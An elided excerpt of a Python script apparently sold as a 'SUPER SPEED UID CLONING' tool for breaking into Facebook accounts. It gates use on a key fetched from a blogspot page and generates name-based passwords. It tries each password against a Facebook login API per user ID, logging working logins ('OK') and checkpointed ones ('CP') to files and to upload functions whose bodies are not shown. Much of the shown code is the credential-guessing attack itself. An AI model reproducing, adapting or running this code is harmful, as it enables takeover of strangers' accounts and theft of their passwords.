...
def notice():
	...
	runtxt("\033[0;92m 𝐀𝐃𝐌𝐈𝐍 𝐌𝐃 𝐒𝐇𝐀𝐊𝐈𝐋 𝐈𝐒𝐋𝐀𝐌")
	subprocess.check_output(["am", "start", "https://www.facebook.com/mdshakilislam.4321?mibextid=ZbWKwL"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://milon5xyz.blogspot.com/2023/05/approved.html?m=1').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %s𝐒𝐔𝐏𝐄𝐑 𝐒𝐏𝐄𝐄𝐃 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐈𝐍𝐆"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s𝟐.𝟎"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Shakil): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[𝐎𝐊] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [𝐎𝐊] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[𝐂𝐏] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [𝐂𝐏] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
